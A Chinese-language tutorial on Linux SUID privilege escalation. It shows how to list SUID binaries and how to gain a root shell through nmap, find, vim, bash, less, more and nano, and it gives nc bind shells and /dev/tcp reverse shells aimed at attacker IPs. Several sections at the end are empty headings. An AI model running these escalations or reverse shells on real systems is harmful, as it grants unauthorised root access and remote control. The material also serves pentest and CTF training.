# SUID提权

 SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.

 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件`ls`,其属主为root,当我们通过非root用户登录时,如果`ls`设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.

 利用此特性,我们可通过SUID进行提权

## 通过root设置的具有SUID权限的二进制可执行文件提权

如果以下文件具有SUID权限,那就可以利用他们进行提权

```
nmap
vim
find
bash
more
less
nano
cp
awk
```

利用以下命令查看哪些文件具有SUID权限

```
1.find / -perm -u=s 2>/dev/null

2.find / -user root -perm -4000 -print 2>/dev/null

3.find / -perm -u=s -type f 2>/dev/null
```

以上命令列出来的二进制文件都是以root权限运行的

以下命令可以确认是否是SUID权限

```
ls -l filename
```

![image-20211020181505339](images/1.png)

### nmap

nmap设置了SUID权限的可以进行提权,不过那只是早期的nmap了需要的nmap版本2.02至5.21

现在的nmap已经达到了7.2的版本了

在早期nmap版本中,带有交互模式,因而允许用户执行shell命令

使用如下命令进入nmap交互模式:

```bash
nmap --interactive
```

在nmap交互模式中 通过如下命令提权

```sh
nmap> !sh
sh-3.2# whoami
root
```

msf当中也有利用nmap进行提权的模块

```
exploit/unix/local/setuid_nmap
```

这里我就没有进行演示了,我的nmap版本已经是7.2了

### find

这个比较常见,不过我的ubantu并没有设置find的SUID权限需要用以下命令去设置

```
chmod u+s filename   设置SUID权限

chmod u-s filename   去掉SUID设置
```

find命令在/usr/bin下

![image-20211020182907857](images/2.png)

可以看到,我给我的ubantu的find设置了SUID权限,现在已经是root权限了

![image-20211020182958996](images/3.png)

那我就可以利用find去进行权限提升

find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root

命令如下

```
touch/mkdir anyfile #必须要有这个文件(这个目录有一个test文件,随便找一个文件即可)
find anyfile -exec whoami \;#看看这个文件是以什么身份运行的(执行了exec命令)
find anyfile -exec '/bin/sh' \;#进入shell(和反弹shell原理相似,执行了/bin/sh命令,然后我们的输出会被当做系统命令执行,又是以root权限运行,就实现了提权)
```

![image-20211020183517274](images/4.png)

可以看到我的权限已经变为了root权限

也可以直接执行命令

```
find / -exec '/bin/sh' \;
```

![image-20211020194903622](images/5.png)

除此之外，linux一般都安装了nc 我们也可以利用nc 广播或反弹shell

广播shell:

```bash
find user -exec nc -lvp 4444 -e '/bin/sh' \;
```

在攻击机上:

```bash
nc 靶机ip 4444
```

反弹shell

```bash
find anyfile -exec bash -c 'bash -i >& /dev/tcp/47.xxx.xxx.96/4444 0>&1' \;
```

在攻击机上:

```bash
nc -lvp 4444
```

如果执行了还是www权限,那就需要用到-p参数

```
find / -exec '/bin/sh' -p \;
```

> 默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid

![image-20211031173215509](images/6.png)

因此需要用到参数-p，参数-p的时候则不会再覆盖

### vim

当vim拥有root权限的时候我们就能去读取系统上的所有文件

提权操作

```
vim /etc/passwd

按下esc输入
:set shell=/bin/sh  #设置shell内容
然后按esc再输入
:shell  #进入shell

也可以直接输入vim随便进入一个文本编译器以同样的方式提权
```

![image-20211024224419983](images/7.png)

当然vim.basic和vim.tiny如果有SUID权限也能这样提权

### bash

可以看到我的bash是root权限,给我的bash加上一个SUID权限

![image-20211024224919572](images/8.png)

直接输入一个`bash -p`新开一个bash shell即可提权

![image-20211024225012025](images/9.png)

### less

![image-20211025224326325](images/10.png)

添加SUID权限

提权操作

```
less /etc/passwd
输入
!/bin/sh

less和more命令需要加上对应的文件名
```

![image-20211025224457190](images/11.png)

提权成功

### more

提权操作与less相同

![image-20211025224653890](images/12.png)

### nano

添加SUID权限

![image-20211025225109272](images/13.png)

nano是上古时代的文本编译器了可以直接输入nano进入

```
nano #进入文本编译器

Ctrl + R
Ctrl + X 
然后就可以输入命令了

直接输入/bin/sh提权会无法输入,我就直接反弹shell了
bash -i >& /dev/tcp/192.168.121.129/2333 0>&1

```

![image-20211025230004421](images/14.png)

不过这里我反弹shell后还是seed用户并不是root

### cp

### awk

### git

### php

### date
